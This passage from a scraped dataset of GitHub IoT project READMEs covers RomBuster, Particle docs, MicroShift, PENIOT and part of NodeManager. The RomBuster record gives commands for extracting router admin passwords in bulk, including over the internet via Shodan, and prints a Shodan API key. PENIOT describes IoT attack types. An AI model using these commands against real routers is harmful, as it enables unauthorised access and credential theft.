router.\nexploit(address) - Exploit single router by given address.\nExamples\nExploiting single router\nfrom rombuster import RomBuster\nrombuster = RomBuster()\ncreds = rombuster.exploit('192.168.99.1')\nprint(creds)", "link": "https://github.com/EntySec/RomBuster", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "rombuster\nrombuster is a router exploitation -----> tool !!!  that allows to disclosure network router admin password.\nfeatures\nexploits vulnerabilities in most popular routers such as d-link, zyxel, tp-link, cisco and huawei.\noptimized to exploit multiple routers at one time from list.\nsimple cli and api usage.\ninstallation\npip3 install git+https://github.com/entysec/rombuster\nbasic usage\nto use rombuster just type rombuster in your terminal.\nusage: rombuster [-h] [-o output] [-i input] [-a address] [--shodan shodan]\n[--zoomeye zoomeye] [-p pages]\nrombuster is a router exploitation tool that allows to disclosure network\nrouter admin password.\noptional arguments:\n-h, --help show this help message and exit\n-o output, --output output\noutput result to file.\n-i input, --input input\ninput file of addresses.\n-a address, --address address\nsingle address.\n--shodan shodan shodan api key for exploiting devices over internet.\n--zoomeye zoomeye zoomeye api key for exploiting devices over internet.\n-p pages, --pages pages\nnumber of pages you want to get from zoomeye.\nexamples\nexploiting single router\nlet's hack my router just for fun.\nrombuster -a 192.168.99.1\nexploiting routers from internet\nlet's try to use shodan search engine to exploit routers over internet.\nrombuster --shodan pskindqe1gyxggecyz2191h2jos9qvgd\nnote: given shodan api key (pskindqe1gyxggecyz2191h2jos9qvgd) is my pro api key, you can use this key or your own, be free to use all our resources for free :)\nexploiting routers from input file\nlet's try to use opened database of routers.\nrombuster -i routers.txt -o passwords.txt\nnote: it will exploit all routers in routers.txt list by their addresses and save all obtained passwords to passwords.txt.\napi usage\nrombuster also has their own python api that can be invoked by importing rombuster to your code.\nfrom rombuster import rombuster\nbasic functions\nthere are all rombuster basic functions that can be used to exploit specified router.\nexploit(address) - exploit single router by given address.\nexamples\nexploiting single router\nfrom rombuster import rombuster\nrombuster = rombuster()\ncreds = rombuster.exploit('192.168.99.1')\nprint(creds)", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000431, "year": null}, {"Unnamed: 0": 448, "autor": 448, "date": null, "content": "Particle Documentation\nHere you'll find the documentation for the Particle platform, including the Particle Device Cloud, Photon, Electron, and Spark Core.\nTo view this documentation, visit our website, where the documentation is hosted.\nLocal Hosting\nThis documentation uses a fabulous tool from the folks at Segment called Metalsmith. Metalsmith is a static site generator that builds static HTML sites from source material in other formats; in this case, Markdown and Handlebars.\nTo set up a server running at http://localhost:8080, follow the installation instructions below...\nNOTE: Any changes made to the source content should be automatically picked up by the browser via livereload.\nContainerized Hosting\nIf you have Docker installed, then you can simply run the following commands to get started...\n$ cd <particle-iot/docs>/\n$ scripts/docker-server.sh --help\nusage: particle-docs [--build] [--deploy] [--run-tests] [--spell-check]\nBuild, test and deploy a local documentation server.\n-b, --build Build and install documentation packages.\n-d, --deploy Launch documentation server at https://localhost:8080.\n-h, --help Display this help and exit.\n-s, --spell-check Run the spell-checker to verify spelling and update dictionary file.\n-t, --run-tests Run CI tests.\nNOTE: If no options are specified, then ALL options will be selected.\nNOTE: Containerized hosting is currently only available on Linux devices. Mac is has an open issue involving localhost, and Windows has not been tested at this time.\nBare-metal Hosting\nDevice Setup\nTo host this documentation locally, you'll need Node.js and npm (see the engines section of package.json for the exact versions):\nbrew install nodejs\nOnce you have Node.js set up, navigate to the docs directory on your machine, and use the following commands:\nInstall Dependencies\nTo install any other necessary dependencies, run:\nnpm install\nSpell checking\nTo check the spelling of all Markdown files, run:\nnpm run spell\nTesting\nTo run the tests locally, run:\nnpm test\nThe result will indicate whether the build will pass Travis CI.\nDeployment\nexport SEARCH_INDEX=0 # optional. speeds up the build if you don't need the search\nnpm start\nUpdating Production Documention\nWhen updated documentation is pushed to the master branch, it is automatically pushed to Amazon S3 by Travis CI.\nTo see the latest build, visit the Travis CI page.\nOrganization\nThe majority of the content herein is stored in the src/content directory as a set of Markdown files. Assets such as images and javascript are stored in the src/assets directory.\nStructuring your content\nThe docs dynamically generate a table of contents for navigation purposes based on the headers (i.e. ###) that you use on each page. It is important to note that order and hierarchy matters when you are designing the organization of content on your page. Your page should include the following:\n1 h1 at the top of the page that will serve as the title of the page. You can even copy the title directly from the front-matter of the markdown file like this: # {{title}}\nAs many h2s (##) as you'd like to serve as the section headers for the page.\nUnderneath every h2, if applicable, as many h3s (###) as you'd like to serve as sub-sections within the section. These will appear as nested within the navigation on the left.\nNote that there are only 2 levels of navigation that will appear in the table of contents. h4s and below will not appear in the table of contents.\nDevice Specific Content\nIf you are working on a page that has device-specific content, the first thing you need to do is add the relevant device names to the front-matter of the MD file, like this:\ndevices: [ photon, electron, core ]\nWhere Photon, Electron and Core are the relevant devices to this page.\nThen add a new key to device_features.json for each device that supports the feature:\n{\n\"Core\": [\n...\n],\n\"Photon\": [\n..\n\"backup-ram\"\n],\n\"Electron\": [\n...\n\"backup-ram\"\n]\n}\nThen, in the body of the page, you can specify feature-specific content by using:\n{{#if has-backup-ram}}\n## Backup RAM\n...\n{{/if}} {{!-- has-backup-ram --}}\nFor content that is exclusively for one device and where defining a new feature name doesn't make sense (for example, which pins have PWM support for a device), you can also device-specific content by using:\n{{#if photon}}\nPHOTON SPECIFIC STUFFZ\n{{/if}}\n{{#if core}}\nCORE SPECIFIC STUFFZ\n{{/if}}\n{{#if electron}}\nELECTRON SPECIFIC STUFFZ\n{{/if}}\nPrefer defining new feature names over using device-specific sections.\nAdding a new device\nWhen the firmware is available on a new device, add that device to the docs in these places:\nMake the firmware docs available for the new device by adding an entry to the devices frontmatter in <src/content/reference/firmware.md>\nAlso update devices in the guides and tools frontmatter as appropriate\nUpdate the device selection dropdown in <templates/partials/header.hbs>\nAdd the device in <src/assets/js> rememberDevices()\nAdd a new SVG in <src/assets/image> named <device>.svg\nTell the tests to crawl the new device page in <test/crawler.js>\nRedirects\nWhen moving pages around or defining the default page for a section, add redirect links to redirects.json.\nAttributions\nSome of this documentation is derived from the Arduino documentation, as the Arduino/Wiring language and libraries are used extensively on the Spark Core.\nThis documentation was originally built using Flatdoc, an awesome tool for building beautiful documentation from simple Markdown files. We have made many modifications since, but the inspiration remains.\nContributions\nThis documentation is managed by Particle, but supported by the community. We welcome contributions such as:\nEdits to improve grammar or fix typos (run npm run spell for automated spell check)\nEdits to improve clarity\nAdditional annotated examples for others to follow\nAdditional content that would help provide a complete understanding of the Particle platform\nTranslations to other languages\nMaking a contribution is as simple as forking this repository, making edits to your fork, and contributing those edits as a pull request. For more information on how to make a pull request, see Github's documentation.\nLicense\nThese files have been made available online through a Creative Commons Attribution-ShareAlike 3.0 license.\nYou are welcome to distribute, remix, and use these files for commercial purposes. If you do so, please attribute the original design to Particle both on the website and on the physical packaging of the product or in the instruction manual. All derivative works must be published under the same or a similar license.", "link": "https://github.com/particle-iot/docs", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "particle documentation\nhere you'll find the documentation for the particle platform, including the particle device cloud, photon, electron, and spark core.\nto view this documentation, visit our website, where the documentation is hosted.\nlocal hosting\nthis documentation uses a fabulous -----> tool !!!  from the folks at segment called metalsmith. metalsmith is a static site generator that builds static html sites from source material in other formats; in this case, markdown and handlebars.\nto set up a server running at http://localhost:8080, follow the installation instructions below...\nnote: any changes made to the source content should be automatically picked up by the browser via livereload.\ncontainerized hosting\nif you have docker installed, then you can simply run the following commands to get started...\n$ cd <particle-iot/docs>/\n$ scripts/docker-server.sh --help\nusage: particle-docs [--build] [--deploy] [--run-tests] [--spell-check]\nbuild, test and deploy a local documentation server.\n-b, --build build and install documentation packages.\n-d, --deploy launch documentation server at https://localhost:8080.\n-h, --help display this help and exit.\n-s, --spell-check run the spell-checker to verify spelling and update dictionary file.\n-t, --run-tests run ci tests.\nnote: if no options are specified, then all options will be selected.\nnote: containerized hosting is currently only available on linux devices. mac is has an open issue involving localhost, and windows has not been tested at this time.\nbare-metal hosting\ndevice setup\nto host this documentation locally, you'll need node.js and npm (see the engines section of package.json for the exact versions):\nbrew install nodejs\nonce you have node.js set up, navigate to the docs directory on your machine, and use the following commands:\ninstall dependencies\nto install any other necessary dependencies, run:\nnpm install\nspell checking\nto check the spelling of all markdown files, run:\nnpm run spell\ntesting\nto run the tests locally, run:\nnpm test\nthe result will indicate whether the build will pass travis ci.\ndeployment\nexport search_index=0 # optional. speeds up the build if you don't need the search\nnpm start\nupdating production documention\nwhen updated documentation is pushed to the master branch, it is automatically pushed to amazon s3 by travis ci.\nto see the latest build, visit the travis ci page.\norganization\nthe majority of the content herein is stored in the src/content directory as a set of markdown files. assets such as images and javascript are stored in the src/assets directory.\nstructuring your content\nthe docs dynamically generate a table of contents for navigation purposes based on the headers (i.e. ###) that you use on each page. it is important to note that order and hierarchy matters when you are designing the organization of content on your page. your page should include the following:\n1 h1 at the top of the page that will serve as the title of the page. you can even copy the title directly from the front-matter of the markdown file like this: # {{title}}\nas many h2s (##) as you'd like to serve as the section headers for the page.\nunderneath every h2, if applicable, as many h3s (###) as you'd like to serve as sub-sections within the section. these will appear as nested within the navigation on the left.\nnote that there are only 2 levels of navigation that will appear in the table of contents. h4s and below will not appear in the table of contents.\ndevice specific content\nif you are working on a page that has device-specific content, the first thing you need to do is add the relevant device names to the front-matter of the md file, like this:\ndevices: [ photon, electron, core ]\nwhere photon, electron and core are the relevant devices to this page.\nthen add a new key to device_features.json for each device that supports the feature:\n{\n\"core\": [\n...\n],\n\"photon\": [\n..\n\"backup-ram\"\n],\n\"electron\": [\n...\n\"backup-ram\"\n]\n}\nthen, in the body of the page, you can specify feature-specific content by using:\n{{#if has-backup-ram}}\n## backup ram\n...\n{{/if}} {{!-- has-backup-ram --}}\nfor content that is exclusively for one device and where defining a new feature name doesn't make sense (for example, which pins have pwm support for a device), you can also device-specific content by using:\n{{#if photon}}\nphoton specific stuffz\n{{/if}}\n{{#if core}}\ncore specific stuffz\n{{/if}}\n{{#if electron}}\nelectron specific stuffz\n{{/if}}\nprefer defining new feature names over using device-specific sections.\nadding a new device\nwhen the firmware is available on a new device, add that device to the docs in these places:\nmake the firmware docs available for the new device by adding an entry to the devices frontmatter in <src/content/reference/firmware.md>\nalso update devices in the guides and tools frontmatter as appropriate\nupdate the device selection dropdown in <templates/partials/header.hbs>\nadd the device in <src/assets/js> rememberdevices()\nadd a new svg in <src/assets/image> named <device>.svg\ntell the tests to crawl the new device page in <test/crawler.js>\nredirects\nwhen moving pages around or defining the default page for a section, add redirect links to redirects.json.\nattributions\nsome of this documentation is derived from the arduino documentation, as the arduino/wiring language and libraries are used extensively on the spark core.\nthis documentation was originally built using flatdoc, an awesome tool for building beautiful documentation from simple markdown files. we have made many modifications since, but the inspiration remains.\ncontributions\nthis documentation is managed by particle, but supported by the community. we welcome contributions such as:\nedits to improve grammar or fix typos (run npm run spell for automated spell check)\nedits to improve clarity\nadditional annotated examples for others to follow\nadditional content that would help provide a complete understanding of the particle platform\ntranslations to other languages\nmaking a contribution is as simple as forking this repository, making edits to your fork, and contributing those edits as a pull request. for more information on how to make a pull request, see github's documentation.\nlicense\nthese files have been made available online through a creative commons attribution-sharealike 3.0 license.\nyou are welcome to distribute, remix, and use these files for commercial purposes. if you do so, please attribute the original design to particle both on the website and on the physical packaging of the product or in the instruction manual. all derivative works must be published under the same or a similar license.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000448, "year": null}, {"Unnamed: 0": 458, "autor": 458, "date": null, "content": "MicroShift\nMicroShift is a research project that is exploring how OpenShift1 Kubernetes can be optimized for small form factor and edge computing.\nEdge devices deployed out in the field pose very different operational, environmental, and business challenges from those of cloud computing. These motivate different engineering trade-offs for Kubernetes at the far edge than for cloud or near-edge scenarios. MicroShift's design goals cater to this:\nmake frugal use of system resources (CPU, memory, network, storage, etc.),\ntolerate severe networking constraints,\nupdate (resp. rollback) securely, safely, speedily, and seamlessly (without disrupting workloads), and\nbuild on and integrate cleanly with edge-optimized OSes like Fedora IoT and RHEL for Edge, while\nproviding a consistent development and management experience with standard OpenShift.\nWe believe these properties should also make MicroShift a great tool for other use cases such as Kubernetes applications development on resource-constrained systems, scale testing, and provisioning of lightweight Kubernetes control planes.\nWatch this end-to-end MicroShift provisioning demo video to get a first impression of MicroShift deployed onto a RHEL for edge computing device and managed through Open Cluster Management.\nNote: MicroShift is still early days and moving fast. Features are missing. Things break. But you can still help shape it, too.\n1) more precisely OKD, the Kubernetes distribution by the OpenShift community\nMinimum specs\nIn order to run MicroShift, you will need at least:\n2 CPU cores\n2GB of RAM\n~124MB of free storage space for the MicroShift binary\n64-bit CPU (although 32-bit is technically possible, if you're up for the challenge)\nFor barebones development the minimum requirement is 3GB of RAM, though this can increase if you are using resource-intensive devtools.\nOS Requirements\nThe all-in-one containerized MicroShift can run on Windows, MacOS, and Linux.\nCurrently, the MicroShift binary is known to be supported on the following Operating Systems:\nFedora 33/34\nCentOS 8 Stream\nRHEL 8\nCentOS 7\nUbuntu 20.04\nIt may be possible to run MicroShift on other systems, however they haven't been tested so you may run into issues.\nUsing MicroShift\nTo give MicroShift a try, simply install a recent test version (we don't provide stable releases yet) on a Fedora-derived Linux distro (we've only tested Fedora, RHEL, and CentOS Stream so far) using:\ncurl -sfL https://raw.githubusercontent.com/redhat-et/microshift/main/install.sh | bash\nThis will install MicroShift's dependencies (CRI-O), install it as a systemd service and start it.\nFor convenience, the script will also add a new \"microshift\" context to your $HOME/.kube/config, so you'll be able to access your cluster using, e.g.:\nkubectl get all -A --context microshift\nor\nkubectl config use-context microshift\nkubectl get all -A\nNotes: When installing MicroShift on a system with an older version already installed, it is safest to remove the old data directory and start fresh:\nrm -rf /var/lib/microshift && rm -r $HOME/.microshift\nDeployment Strategies\nInstall via an RPM, utilizing a host-provided cri-o runtime and be lifecycle-managed by systemd\nInstall as a container via Podman, utilizing cri-o runtime and be lifecycle-managed by systemd\nFor app developer deployments:\nRun an all-in-one microshift deployment on which devs can test their applications locally. microshift-aio packages cri-o runtime and can be run and managed via podman and systemd\nKnown Issues\nIf issues occur during deployment checkout the troubleshooting document to view fixes of known issues.\nDeveloping MicroShift\nNote: when building or running ARM64 container images, Linux host environments must have the qemu-user-static package installed. E.g. on Fedora: dnf install qemu-user-static.\nBuilding\nYou can locally build MicroShift using one of two methods, either using a container build (recommended) on Podman or Docker:\nsudo yum -y install make golang\nmake microshift\nor directly on the host after installing the build-time dependencies. When using RHEL ensure the system is registered and run the following before installing the prerequisites.\nARCH=$( /bin/arch )\nsudo subscription-manager repos --enable \"codeready-builder-for-rhel-8-${ARCH}-rpms\"\nThe following packages are required for Fedora and RHEL.\nsudo yum install -y glibc-static gcc make golang\nmake\nEnvironment Configuration\nBefore running MicroShift, the host must first be configured. This can be handled by running\nCONFIG_ENV_ONLY=true ./install.sh\nMicroShift keeps all its state in its data-dir, which defaults to /var/lib/microshift when running MicroShift as privileged user and $HOME/.microshift otherwise. Note that running MicroShift unprivileged only works without node role at the moment (i.e. using --roles=controlplane instead of the default of --roles=controlplane,node).\nKubeconfig\nWhen starting the MicroShift for the first time the Kubeconfig file is created. If you need it for another user or to use externally the kubeadmin's kubeconfig is placed at /var/lib/microshift/resources/kubeadmin/kubeconfig.\nContributing\nFor more information on working with MicroShift, you can find a contributor's guide in CONTRIBUTING.md\nCommunity\nJoin us on Slack! (Invite to the Slack space)\nCommunity meetings are held weekly, Tuesdays at 10:30AM - 11:30AM EST. Be sure to join the community calendar! Click \"Google Calendar\" in the lower right-hand corner to subscribe.", "link": "https://github.com/redhat-et/microshift", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "microshift\nmicroshift is a research project that is exploring how openshift1 kubernetes can be optimized for small form factor and edge computing.\nedge devices deployed out in the field pose very different operational, environmental, and business challenges from those of cloud computing. these motivate different engineering trade-offs for kubernetes at the far edge than for cloud or near-edge scenarios. microshift's design goals cater to this:\nmake frugal use of system resources (cpu, memory, network, storage, etc.),\ntolerate severe networking constraints,\nupdate (resp. rollback) securely, safely, speedily, and seamlessly (without disrupting workloads), and\nbuild on and integrate cleanly with edge-optimized oses like fedora iot and rhel for edge, while\nproviding a consistent development and management experience with standard openshift.\nwe believe these properties should also make microshift a great -----> tool !!!  for other use cases such as kubernetes applications development on resource-constrained systems, scale testing, and provisioning of lightweight kubernetes control planes.\nwatch this end-to-end microshift provisioning demo video to get a first impression of microshift deployed onto a rhel for edge computing device and managed through open cluster management.\nnote: microshift is still early days and moving fast. features are missing. things break. but you can still help shape it, too.\n1) more precisely okd, the kubernetes distribution by the openshift community\nminimum specs\nin order to run microshift, you will need at least:\n2 cpu cores\n2gb of ram\n~124mb of free storage space for the microshift binary\n64-bit cpu (although 32-bit is technically possible, if you're up for the challenge)\nfor barebones development the minimum requirement is 3gb of ram, though this can increase if you are using resource-intensive devtools.\nos requirements\nthe all-in-one containerized microshift can run on windows, macos, and linux.\ncurrently, the microshift binary is known to be supported on the following operating systems:\nfedora 33/34\ncentos 8 stream\nrhel 8\ncentos 7\nubuntu 20.04\nit may be possible to run microshift on other systems, however they haven't been tested so you may run into issues.\nusing microshift\nto give microshift a try, simply install a recent test version (we don't provide stable releases yet) on a fedora-derived linux distro (we've only tested fedora, rhel, and centos stream so far) using:\ncurl -sfl https://raw.githubusercontent.com/redhat-et/microshift/main/install.sh | bash\nthis will install microshift's dependencies (cri-o), install it as a systemd service and start it.\nfor convenience, the script will also add a new \"microshift\" context to your $home/.kube/config, so you'll be able to access your cluster using, e.g.:\nkubectl get all -a --context microshift\nor\nkubectl config use-context microshift\nkubectl get all -a\nnotes: when installing microshift on a system with an older version already installed, it is safest to remove the old data directory and start fresh:\nrm -rf /var/lib/microshift && rm -r $home/.microshift\ndeployment strategies\ninstall via an rpm, utilizing a host-provided cri-o runtime and be lifecycle-managed by systemd\ninstall as a container via podman, utilizing cri-o runtime and be lifecycle-managed by systemd\nfor app developer deployments:\nrun an all-in-one microshift deployment on which devs can test their applications locally. microshift-aio packages cri-o runtime and can be run and managed via podman and systemd\nknown issues\nif issues occur during deployment checkout the troubleshooting document to view fixes of known issues.\ndeveloping microshift\nnote: when building or running arm64 container images, linux host environments must have the qemu-user-static package installed. e.g. on fedora: dnf install qemu-user-static.\nbuilding\nyou can locally build microshift using one of two methods, either using a container build (recommended) on podman or docker:\nsudo yum -y install make golang\nmake microshift\nor directly on the host after installing the build-time dependencies. when using rhel ensure the system is registered and run the following before installing the prerequisites.\narch=$( /bin/arch )\nsudo subscription-manager repos --enable \"codeready-builder-for-rhel-8-${arch}-rpms\"\nthe following packages are required for fedora and rhel.\nsudo yum install -y glibc-static gcc make golang\nmake\nenvironment configuration\nbefore running microshift, the host must first be configured. this can be handled by running\nconfig_env_only=true ./install.sh\nmicroshift keeps all its state in its data-dir, which defaults to /var/lib/microshift when running microshift as privileged user and $home/.microshift otherwise. note that running microshift unprivileged only works without node role at the moment (i.e. using --roles=controlplane instead of the default of --roles=controlplane,node).\nkubeconfig\nwhen starting the microshift for the first time the kubeconfig file is created. if you need it for another user or to use externally the kubeadmin's kubeconfig is placed at /var/lib/microshift/resources/kubeadmin/kubeconfig.\ncontributing\nfor more information on working with microshift, you can find a contributor's guide in contributing.md\ncommunity\njoin us on slack! (invite to the slack space)\ncommunity meetings are held weekly, tuesdays at 10:30am - 11:30am est. be sure to join the community calendar! click \"google calendar\" in the lower right-hand corner to subscribe.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000458, "year": null}, {"Unnamed: 0": 466, "autor": 466, "date": null, "content": "PENIOT: Penetration Testing Tool for IoT\nTable of Contents\nProject Description\nWhat is PENIOT?\nWhy is PENIOT required?\nWhat does PENIOT provide?\nBuild Instructions\nDocumentation\nTesting\nContributors\nDeveloper's Note\nProject Poster\nProject Description\nWhat is PENIOT?\nPENIOT is a penetration testing tool for Internet of Things (IoT) devices. It helps you to test/penetrate your devices by targeting their internet connectivity with different types of security attacks. In other words, you can expose your device to both active and passive security attacks. After deciding target device and necessary information (or parameters) of that device, you can perform active security attacks like altering/consuming system resources, replaying valid communication units and so on. Also, you can perform passive security attacks such as breaching of confidentiality of important information or reaching traffic analysis. Thanks to PENIOT, all those operations can be semi-automated or even fully automated. In short, PENIOT is a package/framework for targeting IoT devices with protocol based security attacks.\nAlso, it gives you a baseline structure for your further injections of new security attacks or new IoT protocols. One of the most important features of PENIOT is being extensible. By default, it has several common IoT protocols and numerous security attacks related to those protocols. But, it can be extended further via exporting basic structure of internally used components so that you can develop your attacks in harmony with the internal structure of the PENIOT.\nWhy is PENIOT required?\nThe IoT paradigm has experienced immense growth in the past decade, with billions of devices connected to the Internet. Most of these devices lack even basic security measures due to their capacity constraints and designs made without security in mind due to the shortness of time-to-market. Due to the high connectivity in IoT, attacks that have devastating effects in extended networks can easily be launched by hackers through vulnerable devices.\nUp until now, penetration testing was done manually if it was not ignored at all. This procedure made testing phase of devices very slow. On the other hand, the firms which produce IoT devices should always be up to date on testing their devices in terms of reliability, robustness as well as their provided functionalities since being exposed to security attacks by malicious people could cause unexpected impacts on end-users. The main aim of PENIOT is to accelerate the process of security testing. It enables you to figure out security flaws on your IoT devices by automating the time consuming penetration testing phase.\nWhat does PENIOT provide?\nFirst of all, PENIOT provides novelty. It is one of the first examples of penetration testing tools on IoT field. There are only one or two similar tools which are specialized on IoT, but they are still on development phase, so not completed yet.\nSince the number of IoT devices is increasing drastically, IoT devices become more and more common in our daily life. Smart homes, smart bicycles, medical sensors, fitness trackers, smart locks and connected factories are just a few examples of IoT products. Given this, we felt the need to choose some of the most commonly used IoT protocols to plant into PENIOT by default. We chose the following protcols as the default IoT protocols included in the PENIOT. These IoT protocols are tested with various types of security attacks such as DoS, Fuzzing, Sniffing and Replay attacks.\nFollowing protocols are currently supported:\nAdvanced Message Queuing Protocol (AMQP)\nBluetooth Low Energy (BLE)\nConstraint Application Protocol (CoAP)\nMessage Queuing Telemetry Transport (MQTT)\nMoreover, it enables you to export internal mainframe of its own implemented protocol and attacks to implement your own protocols or attacks. Also, you can extend already existing protocols with your newly implemented attacks. And lastly, it provides you an easy to use, user friendly graphical user interface.\nBuild Instructions\nFirstly, you need to have Python's setuptools module installed in your machine. Also, you need to install python-tk and bluepy before installation and build.\nIn short, you need the followings before running installation script.\nsetuptools\npython-tk\nbluepy\nYou can build project in your local by executing following codes.\n$ git clone git@github.com:yakuza8/peniot.git\n$ cd peniot\n$ python setup.py install\nEven if we try to provide you up-to-date installation script, there can be some missing parts in it since the project cannot be maintained so long. Please inform us if there is any problem with installation.\nImportant Note: You need to have Radamsa installed in your machine in order for generating fuzzing payloads in fuzzing attacks.\nDocumentation\nYou can find Design Overview Document and Final Design Document under the resources/documents folder. Several diagrams are attached under the resources/diagrams folder. Here is the simplest representation of how PENIOT is separated modules and how it is designed.\nTesting\nMost of the attacks have their own sample integration tests under their attack scripts. In order to run those tests, you need to have a running program for the target protocol. We try to provide you with example programs for each protocol where one can find server/client scripts under each protocol's examples directory.\nContributors\nThis project is contributed by the following project members:\nBerat Cankar\nBilgehan Bing\u00f6l\nDo\u011fukan \u00c7avdaro\u011flu\nEbru \u00c7elebi\nand is supervised by Pelin Ang\u0131n.\nDeveloper's Note\nFirstly, let me thank you for visiting our project site. We tried to provide you how one can penetrate and hack IoT devices over the protocols they use thanks to end-to-end security attacks. Our main purpose is to hack those devices with generic security attacks. One can simply find specific attacks for any protocol, but as I said ours was to provide generic and extendable penetration framework.\nSecondly, PENIOT is developed with Python2.7. And our code maybe had gone into legacy state. But nevertheless, we wanted to share it to public so that anyone could get insight and inspiration to develop their own penetration tools, that is what makes us happy if it could happen.\nThirdly, we also will try to port our tool into Python3 if we can spare necessary time for that. When it happens, we will inform it from this page as well. Thanks for your attention.\nDeveloper: @yakuza8 (Berat Cankar)\nProject Poster", "link": "https://github.com/yakuza8/peniot", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "peniot: penetration testing -----> tool !!!  for iot\ntable of contents\nproject description\nwhat is peniot?\nwhy is peniot required?\nwhat does peniot provide?\nbuild instructions\ndocumentation\ntesting\ncontributors\ndeveloper's note\nproject poster\nproject description\nwhat is peniot?\npeniot is a penetration testing tool for internet of things (iot) devices. it helps you to test/penetrate your devices by targeting their internet connectivity with different types of security attacks. in other words, you can expose your device to both active and passive security attacks. after deciding target device and necessary information (or parameters) of that device, you can perform active security attacks like altering/consuming system resources, replaying valid communication units and so on. also, you can perform passive security attacks such as breaching of confidentiality of important information or reaching traffic analysis. thanks to peniot, all those operations can be semi-automated or even fully automated. in short, peniot is a package/framework for targeting iot devices with protocol based security attacks.\nalso, it gives you a baseline structure for your further injections of new security attacks or new iot protocols. one of the most important features of peniot is being extensible. by default, it has several common iot protocols and numerous security attacks related to those protocols. but, it can be extended further via exporting basic structure of internally used components so that you can develop your attacks in harmony with the internal structure of the peniot.\nwhy is peniot required?\nthe iot paradigm has experienced immense growth in the past decade, with billions of devices connected to the internet. most of these devices lack even basic security measures due to their capacity constraints and designs made without security in mind due to the shortness of time-to-market. due to the high connectivity in iot, attacks that have devastating effects in extended networks can easily be launched by hackers through vulnerable devices.\nup until now, penetration testing was done manually if it was not ignored at all. this procedure made testing phase of devices very slow. on the other hand, the firms which produce iot devices should always be up to date on testing their devices in terms of reliability, robustness as well as their provided functionalities since being exposed to security attacks by malicious people could cause unexpected impacts on end-users. the main aim of peniot is to accelerate the process of security testing. it enables you to figure out security flaws on your iot devices by automating the time consuming penetration testing phase.\nwhat does peniot provide?\nfirst of all, peniot provides novelty. it is one of the first examples of penetration testing tools on iot field. there are only one or two similar tools which are specialized on iot, but they are still on development phase, so not completed yet.\nsince the number of iot devices is increasing drastically, iot devices become more and more common in our daily life. smart homes, smart bicycles, medical sensors, fitness trackers, smart locks and connected factories are just a few examples of iot products. given this, we felt the need to choose some of the most commonly used iot protocols to plant into peniot by default. we chose the following protcols as the default iot protocols included in the peniot. these iot protocols are tested with various types of security attacks such as dos, fuzzing, sniffing and replay attacks.\nfollowing protocols are currently supported:\nadvanced message queuing protocol (amqp)\nbluetooth low energy (ble)\nconstraint application protocol (coap)\nmessage queuing telemetry transport (mqtt)\nmoreover, it enables you to export internal mainframe of its own implemented protocol and attacks to implement your own protocols or attacks. also, you can extend already existing protocols with your newly implemented attacks. and lastly, it provides you an easy to use, user friendly graphical user interface.\nbuild instructions\nfirstly, you need to have python's setuptools module installed in your machine. also, you need to install python-tk and bluepy before installation and build.\nin short, you need the followings before running installation script.\nsetuptools\npython-tk\nbluepy\nyou can build project in your local by executing following codes.\n$ git clone git@github.com:yakuza8/peniot.git\n$ cd peniot\n$ python setup.py install\neven if we try to provide you up-to-date installation script, there can be some missing parts in it since the project cannot be maintained so long. please inform us if there is any problem with installation.\nimportant note: you need to have radamsa installed in your machine in order for generating fuzzing payloads in fuzzing attacks.\ndocumentation\nyou can find design overview document and final design document under the resources/documents folder. several diagrams are attached under the resources/diagrams folder. here is the simplest representation of how peniot is separated modules and how it is designed.\ntesting\nmost of the attacks have their own sample integration tests under their attack scripts. in order to run those tests, you need to have a running program for the target protocol. we try to provide you with example programs for each protocol where one can find server/client scripts under each protocol's examples directory.\ncontributors\nthis project is contributed by the following project members:\nberat cankar\nbilgehan bing\u00f6l\ndo\u011fukan \u00e7avdaro\u011flu\nebru \u00e7elebi\nand is supervised by pelin ang\u0131n.\ndeveloper's note\nfirstly, let me thank you for visiting our project site. we tried to provide you how one can penetrate and hack iot devices over the protocols they use thanks to end-to-end security attacks. our main purpose is to hack those devices with generic security attacks. one can simply find specific attacks for any protocol, but as i said ours was to provide generic and extendable penetration framework.\nsecondly, peniot is developed with python2.7. and our code maybe had gone into legacy state. but nevertheless, we wanted to share it to public so that anyone could get insight and inspiration to develop their own penetration tools, that is what makes us happy if it could happen.\nthirdly, we also will try to port our tool into python3 if we can spare necessary time for that. when it happens, we will inform it from this page as well. thanks for your attention.\ndeveloper: @yakuza8 (berat cankar)\nproject poster", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000466, "year": null}, {"Unnamed: 0": 470, "autor": 470, "date": null, "content": "MySensors NodeManager\nNodeManager is intended to take care on your behalf of all those common tasks that a MySensors node has to accomplish, speeding up the development cycle of your projects. Consider it as a sort of frontend for your MySensors projects. When you need to add a sensor (which requires just uncommeting a single line), NodeManager will take care of importing the required library, presenting the sensor to the gateway/controller, executing periodically the main function of the sensor (e.g. measure a temperature, detect a motion, etc.), allowing you to interact with the sensor and even configuring it remotely.\nFeatures\nAllows managing automatically the complexity behind battery-powered sensors spending most of their time sleeping\nProvides common functionalities to read and report the battery level\nFor the most common sensors, provide embedded code so to allow their configuration with a single line\nManage all the aspects of a sleeping cycle by leveraging smart sleep\nAllow configuring the node and any attached sensors remotely\nAllow waking up a sleeping node remotely at the end of a sleeping cycle\nAllow powering on each connected sensor only while the node is awake to save battery\nReport battery level periodically and automatically or on demand\nCalculate battery level without requiring an additional pin and the resistors\nReport signal level periodically and automatically or on demand\nAllow collecting and averaging multiple samples, tracking the last value and forcing periodic updates for any sensor\nProvide built-in capabilities to handle interrupt-based sensors\nInstallation\nDownload the package or clone the git repository from https://github.com/mysensors/NodeManager\nInstall NodeManager as an Arduino library (https://www.arduino.cc/en/Guide/Libraries)\nUpgrade\nMake a backup copy of the library, remove it, download the latest version of NodeManager and install the new library\nReview the release notes in case there is any manual change required to the main sketch\nPlease be aware when upgrading to v1.8 from an older version this procedure is not supported and the code should be migrated 